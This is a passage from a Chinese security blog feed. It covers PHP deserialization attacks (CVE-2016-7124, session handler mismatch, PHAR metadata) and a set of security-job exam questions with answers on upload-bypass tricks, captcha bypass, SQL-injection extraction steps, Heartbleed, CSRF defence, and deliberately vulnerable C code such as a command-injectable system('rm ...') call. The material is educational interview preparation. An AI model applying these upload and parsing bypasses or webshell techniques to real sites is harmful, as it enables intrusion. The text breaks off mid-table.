title="危险的动作"></a>危险的动作</h2><p>我们在仔细逐层检查__wakeup()函数的过程中，如果看到这些函数的调用中有反序列化出的参数，那么就基本可以断定是存在反序列化漏洞了。<br>第一类：命令执行<br>exec() 执行一个外部程序<br>passthru() 执行外部程序并且显示原始输出<br>popen() 打开进程文件指针<br>system() 执行外部程序，并且显示输出<br>第二类：文件访问<br>file_put_contents() 将一个字符串写入文件<br>file_get_contents() 将整个文件读入一个字符串<br>unlink() 删除文件</p><p>有了以上的基础，可以去看看bugbank的这个视频<br><a href="https://www.bilibili.com/video/BV1Ft41187ZX">https://www.bilibili.com/video/BV1Ft41187ZX</a></p><h1 id="进阶PHP反序列化漏洞"><a href="#进阶PHP反序列化漏洞" class="headerlink" title="进阶PHP反序列化漏洞"></a>进阶PHP反序列化漏洞</h1><h2 id="CVE-2016-7124（绕过-wakeup-函数）"><a href="#CVE-2016-7124（绕过-wakeup-函数）" class="headerlink" title="CVE-2016-7124（绕过__wakeup()函数）"></a>CVE-2016-7124（绕过__wakeup()函数）</h2><p>影响PHP版本：before 5.6.25 and 7.x before 7.0.10<br>bug内容：反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<strong>wakeup( )的执行<br>成因：这些版本的ext/standard/var_unserializer.c函数对无效的对象处理有误。对象属性个数的值大于真实的属性个数就是一个无效对象，而这会使</strong>wakeup()函数被跳过。<br>危害：导致服务器拒绝或其他影响。</p><h2 id="注入对象构造方法"><a href="#注入对象构造方法" class="headerlink" title="注入对象构造方法"></a>注入对象构造方法</h2><p>反序列化可以控制类属性，private会加上%00A%00，而protected会加上%00*%00。<br>由此，我们可以构造pop链进行同名方法的利用。<br>具体可以看这篇<br><a href="https://www.cnblogs.com/zpchcbd/p/12531997.html">https://www.cnblogs.com/zpchcbd/p/12531997.html</a></p><h2 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h2><p>PHP中的Session经序列化后存储，读取时再进行反序列化。<br>PHP中有三种序列化处理器</p><table><thead><tr><th>处理器</th><th>存储方式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+serialize()函数反序列后的值</td></tr><tr><td>php_binary</td><td>键名长度对应的ASCII字符+键名+serialize()函数反序列后的值</td></tr><tr><td>php_serialize()</td><td>serialize()函数反序列后的值</td></tr></tbody></table><p>不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的Session序列化格式不同，就可能产生反序列化漏洞。</p><h2 id="PHAR利用"><a href="#PHAR利用" class="headerlink" title="PHAR利用"></a>PHAR利用</h2><h3 id="PHAR简介"><a href="#PHAR简介" class="headerlink" title="PHAR简介"></a>PHAR简介</h3><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p><h3 id="PHAR文件结构"><a href="#PHAR文件结构" class="headerlink" title="PHAR文件结构"></a>PHAR文件结构</h3><p>PHAR文件由3或4个部分组成：<br>（1）stub就是一个简单的php文件，最简文件头为：<br><?php __HALT_COMPILER( )；?>是可有可无的，若使用?&gt;，则;与?&gt;间至多一个空格。<br>文件头中必须包含__HALT_COMPILER();除此之外没有限制。（PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测）</p><p>（2）manifest describing the contents //PHAR文件描述该部分存储文件名、文件大小等信息</p><p>（3）the file contents //PHAR文件内容</p><p>（4）[optional] a signature for verifying Phar integrity (phar file format only) //可选的签名部分，支持MD5和SHA1</p><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>PHAR文件的Meta-data可以是任何能够序列化的PHP对象，当PHAR文件被任何文件系统函数首次通过phar://协议解析时Meta-data部分会被反序列化，这个反序列化过程就是我们的攻击点，Meta-data部分填充payload。</p><p>上面几种的复现都可以在这里找到<br><a href="https://www.cnblogs.com/ichunqiu/p/10484832.html">https://www.cnblogs.com/ichunqiu/p/10484832.html</a></p><p>参考：<br><a href="https://www.cnblogs.com/ichunqiu/p/10484832.html">https://www.cnblogs.com/ichunqiu/p/10484832.html</a><br><a href="https://www.cnblogs.com/ssooking/articles/6082457.html">https://www.cnblogs.com/ssooking/articles/6082457.html</a><br><a href="https://www.cnblogs.com/zpchcbd/p/12531997.html">https://www.cnblogs.com/zpchcbd/p/12531997.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>安全岗笔试题集</title>
    <link href="https://blog.pillar.fun/2021/02/28/%E5%AE%89%E5%85%A8%E5%B2%97%E7%AC%94%E8%AF%95%E9%A2%98%E9%9B%86/"/>
    <id>https://blog.pillar.fun/2021/02/28/%E5%AE%89%E5%85%A8%E5%B2%97%E7%AC%94%E8%AF%95%E9%A2%98%E9%9B%86/</id>
    <published>2021-02-28T07:31:00.000Z</published>
    <updated>2021-03-01T11:55:27.828Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>持续更新0.0</p><h1 id="深信服"><a href="#深信服" class="headerlink" title="深信服"></a>深信服</h1><h2 id="Q1：请尽可能列举你知道的网站未能正确使用图片验证码机制的情况，以及如何绕过其限制？"><a href="#Q1：请尽可能列举你知道的网站未能正确使用图片验证码机制的情况，以及如何绕过其限制？" class="headerlink" title="Q1：请尽可能列举你知道的网站未能正确使用图片验证码机制的情况，以及如何绕过其限制？"></a>Q1：请尽可能列举你知道的网站未能正确使用图片验证码机制的情况，以及如何绕过其限制？</h2><ul><li>图形验证码的内容可OCR识别</li><li>多阶段的过程，先校验验证码，成功之后的下一步不需要验证码，可以直接抓包，跳过第一步的验证</li><li>验证码在服务段校验后，没有立即失效，需要客户端再次请求才会更新，只要客户端不再请求验证码即可使用原来的验证码</li><li>生成验证码的模块是否根据提供的参数生成验证码，如果是说明存在漏洞</li><li>有些验证码与数据包中的某个参数绑定，比如cookie中的某个属性，只要它们相匹配，验证码就认为是有效的。这种机制存在漏洞。</li><li>在某些情况下，验证码隐藏在HTML源码或通过其他方式获得“明文”</li><li>在服务器端，是否只有在验证码检验通过后才进行用户名和密码的检验，如果不是说明存在漏洞。</li></ul><h2 id="Q2：请尽可能列举你知道的网站未能安全实现文件上传功能的情况，以及如何绕过其限制？"><a href="#Q2：请尽可能列举你知道的网站未能安全实现文件上传功能的情况，以及如何绕过其限制？" class="headerlink" title="Q2：请尽可能列举你知道的网站未能安全实现文件上传功能的情况，以及如何绕过其限制？"></a>Q2：请尽可能列举你知道的网站未能安全实现文件上传功能的情况，以及如何绕过其限制？</h2><p>允许直接上传脚本文件：php、jsp、aspx<br>结合web server解析漏洞<br>一、IIS 5.x/6.0解析漏洞<br>IIS 6.0解析利用方法有两种<br>1.目录解析 /xx.asp/xx.jpg<br>2.文件解析 wooyun.asp;.jpg<br>二、IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞<br>在默认Fast-CGI开启状况下,黑阔上传一个名字为wooyun.jpg，内容为<br><?PHP                                                      ?>‘);?&gt;的文件<br>然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php<br>三、Nginx &lt;8.03 空字节代码执行漏洞<br>影响版:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37<br>Nginx在图片中嵌入PHP代码<br>然后通过访问xxx.jpg%00.php来执行其中的代码<br>四、Apache解析漏洞<br>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.<br>比如wooyun.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php.<br>五、其他<br>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。<br>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:<br>&lt;FilesMatch “wooyun.jpg”&gt; SetHandler application/x-httpd-php <br>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。<br>前端文件名限制<br>firebug禁用javascript<br>firebug修改允许上传类型<br>Burp绕过限制<br>本地构造html代码<br>后端检测-MIME<br>修改MIME类型<br>后端检测-文件头<br>我们可以通过使用jpg图片马来绕过！<br>后端检测-文件扩展名，黑名单与白名单<br>大小写<br>寻找黑白名单的遗漏点<br>配合解析漏洞来绕过<br>%00和\x00截断<br>文件内容绕过:<br>图片马<br>加密webshell<br>填充垃圾数据</p><h2 id="Q3：利用汇编语言编写一道程序，不使用乘法以及除法指令，计算-AX-5-300h-2-100h-8的值。"><a href="#Q3：利用汇编语言编写一道程序，不使用乘法以及除法指令，计算-AX-5-300h-2-100h-8的值。" class="headerlink" title="Q3：利用汇编语言编写一道程序，不使用乘法以及除法指令，计算(((AX*5)+300h)/2-100h)*8的值。"></a>Q3：利用汇编语言编写一道程序，不使用乘法以及除法指令，计算(((AX*5)+300h)/2-100h)*8的值。</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov bx,ax</span><br><span class="line">shl ax,2</span><br><span class="line">add ax,bx</span><br><span class="line">add ax,300h</span><br><span class="line">shr ax,1</span><br><span class="line">sub ax,100h</span><br><span class="line">shl ax,3</span><br></pre></td></tr></table></figure><h2 id="Q4-阅读如下代码，其中main函数参数可以被攻击者控制，那么main函数中存在哪些漏洞，指出漏洞具体位置及问题，并说明这些代码中漏洞的修复方法"><a href="#Q4-阅读如下代码，其中main函数参数可以被攻击者控制，那么main函数中存在哪些漏洞，指出漏洞具体位置及问题，并说明这些代码中漏洞的修复方法" class="headerlink" title="Q4:阅读如下代码，其中main函数参数可以被攻击者控制，那么main函数中存在哪些漏洞，指出漏洞具体位置及问题，并说明这些代码中漏洞的修复方法"></a>Q4:阅读如下代码，其中main函数参数可以被攻击者控制，那么main函数中存在哪些漏洞，指出漏洞具体位置及问题，并说明这些代码中漏洞的修复方法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读取指定的文件中的内容并返回该文件base64编码后的内容，函数失败则返回NULL，在非NULL情况下需要调用该函数后手动释放内存，该函数中不存在安全性问题</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">readBase64File</span><span class="params">(<span class="keyword">char</span> *fileName)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> filePath[<span class="number">260</span>];</span><br><span class="line">    <span class="keyword">char</span> fileCmd[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span> *fileName;</span><br><span class="line">    <span class="keyword">int</span> dirIdx;</span><br><span class="line">    <span class="keyword">char</span> *fileContent;</span><br><span class="line">    <span class="keyword">char</span> *dirPaths[<span class="number">4</span>];</span><br><span class="line">    dirPaths[<span class="number">0</span>] = ”/home/data1/”;</span><br><span class="line">    dirPaths[<span class="number">1</span>] = ”/home/data2/”;</span><br><span class="line">    dirPaths[<span class="number">2</span>] = ”/home/data3/”;</span><br><span class="line">    dirPaths[<span class="number">3</span>] = ”/home/data4/”;</span><br><span class="line">    fileName = argv[<span class="number">1</span>];</span><br><span class="line">    dirIdx = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (dirIdx &gt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(“file index error!\n”);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(filePath, dirPaths[dirIdx]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(filePath) + <span class="built_in">strlen</span>(fileName) &lt; <span class="number">260</span>)</span><br><span class="line">        <span class="built_in">strcat</span>(filePath, fileName);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    fileContent = readBase64File(filePath);</span><br><span class="line">    <span class="keyword">if</span> (fileContent == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(“read filecontent error!\n”);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(“file content is: %s\n”, fileContent);</span><br><span class="line">        <span class="built_in">free</span>(fileContents);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(fileCmd, “rm ”);</span><br><span class="line">    <span class="built_in">strcat</span>(fileCmd, fileName);</span><br><span class="line">    <span class="built_in">printf</span>(fileCmd);</span><br><span class="line">    system(fileCmd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命令执行，目录穿越，缓冲区溢出，数组越界访问，格式化字符串<br>（1）system(fileCmd);处存在命令执行漏洞及任意文件删除问题，需要进行命令执行过滤<br>（2）printf(fileCmd);处存在格式化字符串漏洞，此处可以通过%s来打印命令<br>（3）fileContent =readBase64File(filePath);处存在目录穿越，任意文件读取漏洞，此处可以对../这种目录穿越特征进行过滤<br>（4）strcpy(filePath, dirPaths[dirIdx]);处存在数组访问越界，从而可以也可以导致缓冲区溢出问题，判断有符号数的dirIdx时需要判断其大于等于0</p><h2 id="Q5-谈谈在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？"><a href="#Q5-谈谈在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？" class="headerlink" title="Q5:谈谈在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？"></a>Q5:谈谈在WEB类安全问题的应急处置过程中web日志溯源攻击路径的思路？</h2><p>在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。<br>首先确定受到攻击的时间范围，以此为线索，查找这个时间范围内可疑的日志，根据可疑ip、攻击特征等进一步排查（WEB日志会记录客户端对WEB应用的访问请求，这其中包括正常用户的访问请求和攻击者的恶意行为。通过大量的分析，我们发现攻击者在对网站入侵时，向网站发起的请求中会带有特定的攻击特征，如利用WEB扫描器在对网站进行漏洞扫描时往往会产生大量的404错误日志，当有攻击者对网站进行SQL注入漏洞探测时，WEB访问日志中通常会出现and 1=1等字样），最终锁定攻击者，确认攻击的手段，还原攻击过程。</p><h2 id="Q6-心脏滴血漏洞产生的原因，危害都有哪些？"><a href="#Q6-心脏滴血漏洞产生的原因，危害都有哪些？" class="headerlink" title="Q6:心脏滴血漏洞产生的原因，危害都有哪些？"></a>Q6:心脏滴血漏洞产生的原因，危害都有哪些？</h2><p>Heartbleed漏洞，这项严重缺陷(CVE-2014-0160)的产生是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。通过读取网络服务器内存，攻击者可以访问敏感数据，从而危及服务器及用户的安全。敏感的安全数据，如服务器的专用主密钥，可使攻击者在服务器和客户端未使用完全正向保密时，通过被动中间人攻击解密当前的或已存储的传输数据，或在通信方使用完全正向保密的情况下，发动主动中间人攻击。攻击者无法控制服务器返回的数据，因为服务器会响应随机的内存块。<br>漏洞还可能暴露其他用户的敏感请求和响应，包括用户任何形式的POST请求数据，会话cookie和密码，这能使攻击者可以劫持其他用户的服务身份。在其披露时，约有17%或五十万通过认证机构认证的互联网安全网络服务器被认为容易受到攻击。电子前哨基金会，ArsTechnica，和布鲁斯·施奈尔都认为心脏出血漏洞是“灾难性的”。<br>漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。</p><h2 id="Q7-Apache，IIS，Nginx的文件解析漏洞都是如何解析和利用的？"><a href="#Q7-Apache，IIS，Nginx的文件解析漏洞都是如何解析和利用的？" class="headerlink" title="Q7:Apache，IIS，Nginx的文件解析漏洞都是如何解析和利用的？"></a>Q7:Apache，IIS，Nginx的文件解析漏洞都是如何解析和利用的？</h2><p>Apache解析漏洞。它 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.<br>比如upupimage.php.owf.rar “.owf”和”.rar”?这两种后缀是apache不可识别解析,apache就会把upupimage.php.owf.rar解析成php.<br>IIS 解析漏洞。<br>一是IIS5.x/6.0中的/xx.asp/xx.jpg ，网站下建立文件夹的名字为.asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br>二 是123.asp;.jpg会被服务器看成是123.asp，IIS6.0 默认的可执行文件除了asp还包含这三种/upupimage.asa/upupimage.cer /upupimage.cdx<br>nginx解析漏洞。<br>一是nginx默认Fast-CGI开启状况下,黑阔上传一个名字为upupimage.jpg，然后访问upupimage.jpg/.php。<br>二是Nginx在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码，影响版:0.5.,0.6.,0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p><h2 id="Q8：从哪些方面可以进行CSRF漏洞防御？"><a href="#Q8：从哪些方面可以进行CSRF漏洞防御？" class="headerlink" title="Q8：从哪些方面可以进行CSRF漏洞防御？"></a>Q8：从哪些方面可以进行CSRF漏洞防御？</h2><p>CSRF漏洞防御主要可以从三个层面进行，即服务端的防御、用户端的防御和安全设备的防御。<br>1.检测HTTPreferer字段同域。根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问<a href="http://bank.test/test?page=10&amp;userID=101&amp;money=10000">http://bank.test/test?page=10&amp;userID=101&amp;money=10000</a> 页面完成，用户必须先登录bank.test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank. test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求<br>2.限制sessioncookie的生命周期。CSRF攻击是有条件的，当用户访问恶意链接时，认证的cookie仍然有效，所以当用户关闭页面时要及时清除认证cookie<br>3.使用验证码。虽然攻击者已经通过获取cookie得到用户的身份，但是通过在你的表单中包括验证码，事实上网站已经消除了跨站请求伪造攻击的风险。可以在任何需要执行操作的任何表单中使用这个流程。<br>4.cookie关键字段设置HttpOnly属性。可以在一定程度防御CSRF。</p><h2 id="Q9：登录一个应用程序后，服务器建立以下cookie"><a href="#Q9：登录一个应用程序后，服务器建立以下cookie" class="headerlink" title="Q9：登录一个应用程序后，服务器建立以下cookie:"></a>Q9：登录一个应用程序后，服务器建立以下cookie:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-cookie: sess&#x3D;abcd1129efgh;</span><br></pre></td></tr></table></figure><p>单击“退出”按钮后，应用程序执行以下客户端脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie&#x3D;”sess&#x3D;”;</span><br><span class="line">document.location&#x3D;”&#x2F;”</span><br></pre></td></tr></table></figure><p>通过这种行为，可以得出什么结论？</p><p>退出功能存在缺陷。<br>上述脚本使浏览器中当前保存的会话令牌失效，也就是说，随后的任何请求将不会提交之前的令牌值。然后，该脚本将启动一个指向应用程序起始页面的重定向。任何访问受保护功能的尝试将遭到拒绝，因为相关请求并不属于通过验证的会话的一部分。<br>客户端应用程序并未将已执行了退出操作这一信息传达给服务器。服务器上的用户会话将仍处于活动状态，如果将之前发布的令牌提交给服务器，服务器将继续接受该令牌。在会话超时或以其他方式被清除之前，这种情况会一直持续。在这段时间内，已通过某种方式截获或猜测出令牌值的攻击者就可以继续使用令牌来劫持用户会话。<br>简答说就是只把客户端cookie清了而没有去管服务端。</p><h2 id="Q10：简述一下SOCKS协议TCP穿透原理"><a href="#Q10：简述一下SOCKS协议TCP穿透原理" class="headerlink" title="Q10：简述一下SOCKS协议TCP穿透原理"></a>Q10：简述一下SOCKS协议TCP穿透原理</h2><p>客户端（需要代理方）向SOCKS服务器（代理方）发出代理请求信息<br>SOCKS代理服务器应答<br>客户端接到应答后向SOCKS服务器发送目的IP和端口<br>SOCKS服务器与目的IP、端口建立TCP连接，并向客户端应答可以代理<br>SOCKS服务器将客户端发出的信息传到目的方，将目的方发出的信息传到客户端，代理完成</p><h2 id="Q11：简述一下利用SQL注入漏洞拖取数据的过程"><a href="#Q11：简述一下利用SQL注入漏洞拖取数据的过程" class="headerlink" title="Q11：简述一下利用SQL注入漏洞拖取数据的过程"></a>Q11：简述一下利用SQL注入漏洞拖取数据的过程</h2><p>收集应用程序的可测试点<br>确定可测试点是否是可注入点<br>数据库类型探测<br>数据库基本信息探测，包括当前数据库用户名、当前用户名权限、数据库表信息（几个表、几个列、表名称、列名称）<br>利用漏洞爆取数据（明注入、盲注入）</p><h2 id="Q12：用C语言分别编写含有以下漏洞的函数："><a href="#Q12：用C语言分别编写含有以下漏洞的函数：" class="headerlink" title="Q12：用C语言分别编写含有以下漏洞的函数："></a>Q12：用C语言分别编写含有以下漏洞的函数：</h2><p>（1）通过函数的输入参数可控的缓冲区溢出漏洞的函数，以及对应的修复该漏洞的函数<br>（2）通过函数的输入参数可控的整数溢出漏洞的函数，以及对应的修复该漏洞的函数<br>样例：<br>含有格式化字符串漏洞函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">format_vul</span><span class="params">(<span class="keyword">char</span> *outstr)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(outstr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式化字符串漏洞的修复函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">format_vul</span><span class="params">(<span class="keyword">char</span> *outstr)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, outstr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">缓冲区溢出漏洞函数：</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buffer_vul</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(str, buf);</span><br><span class="line">&#125;</span><br><span class="line">缓冲区溢出漏洞修复：</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buffer_vul</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt;= <span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(str, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">整数溢出漏洞函数：</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">int_vul</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">int</span> type)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    arr[idx] = type;</span><br><span class="line">&#125;</span><br><span class="line">整数溢出漏洞修复：</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">int_vul</span><span class="params">(<span class="keyword">int</span> idx, <span class="keyword">int</span> type)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">8</span> || idx &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    arr[idx] = type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Q13：汇编反写C"><a href="#Q13：汇编反写C" class="headerlink" title="Q13：汇编反写C"></a>Q13：汇编反写C</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func:</span><br><span class="line">        mov     ecx, eax</span><br><span class="line">        lea     edx, [ecx+1]</span><br><span class="line">loop:</span><br><span class="line">        mov     al, [ecx]</span><br><span class="line">        inc     ecx</span><br><span class="line">        test    al, al</span><br><span class="line">        jnz     loop</span><br><span class="line">        sub     ecx, edx</span><br><span class="line">        mov     eax, ecx</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse:</span><br><span class="line">        mov     ebp, eax ;eax为输入的参数1</span><br><span class="line">        mov     edi, edx ;edx为输入的参数2</span><br><span class="line">        mov     esi, ebx ;ebx为输入的参数3</span><br><span class="line"></span><br><span class="line">        mov     eax, ebp</span><br><span class="line">        call    func</span><br><span class="line">        push    eax</span><br><span class="line"></span><br><span class="line">        xor     ebx, ebx</span><br><span class="line">        xor     ecx, ecx</span><br><span class="line">        xor     ebp, ebp</span><br><span class="line">        jmp     label4</span><br><span class="line"></span><br><span class="line">label1:</span><br><span class="line">        lea     eax, [ebp*4]</span><br><span class="line">        add     eax, edi</span><br><span class="line">        mov     eax, [eax]</span><br><span class="line">        cmp     eax, ecx</span><br><span class="line">        jbe     label2</span><br><span class="line"></span><br><span class="line">        mov     ebx, ecx</span><br><span class="line">        mov     ecx, eax</span><br><span class="line">        jmp     label3</span><br><span class="line"></span><br><span class="line">label2:</span><br><span class="line">        cmp     eax, ebx</span><br><span class="line">        jbe     label3</span><br><span class="line"></span><br><span class="line">        mov     ebx, eax</span><br><span class="line"></span><br><span class="line">label3:</span><br><span class="line">        inc     ebp</span><br><span class="line"></span><br><span class="line">label4:</span><br><span class="line">        cmp     ebp, esi</span><br><span class="line">        jb      label1</span><br><span class="line">        pop     eax</span><br><span class="line">        add     eax, ebx</span><br><span class="line">        add     eax, ecx</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure><p>以上为汇编码的两个函数func和reverse，分析这两个函数并编写等价的C代码函数<br>等价的C代码函数如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mystrLen</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *pstr = str+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>( *str++ );</span><br><span class="line">    <span class="keyword">return</span> str - pstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">unsigned</span> <span class="keyword">int</span> numArr[], <span class="keyword">unsigned</span> <span class="keyword">int</span> numLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> big1,big2;</span><br><span class="line">    len = mystrLen(str);</span><br><span class="line">    big1 = <span class="number">0</span>;</span><br><span class="line">    big2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; numLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (numArr[i] &gt; big1)&#123;</span><br><span class="line">            big2 = big1;</span><br><span class="line">            big1 = numArr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (numArr[i] &gt; big2)&#123;</span><br><span class="line">            big2 = numArr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len + big1 + big2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Q14-请回答如下端口默认对应的服务，以及在渗透测试过程中我们可以从哪些角度考虑其安全问题。"><a href="#Q14-请回答如下端口默认对应的服务，以及在渗透测试过程中我们可以从哪些角度考虑其安全问题。" class="headerlink" title="Q14:请回答如下端口默认对应的服务，以及在渗透测试过程中我们可以从哪些角度考虑其安全问题。"></a>Q14:请回答如下端口默认对应的服务，以及在渗透测试过程中我们可以从哪些角度考虑其安全问题。</h2><p>端口：21、22、873、1433、3306、6379、11211</p><table border="0" cellspacing="2" class="MsoNormalTable ke-zeroborder" style="width: 478.4pt;margin-left: 3.15pt;">  <tbody>   <tr>    <td>     <p>      <span>端口</span>     </p>    </td>    <td>     <p>      <span>服务</span>     </p>    </td>    <td>     <p>      <span>说明</span>     </p>    </td>   </tr>   <tr>    <td>     <p>      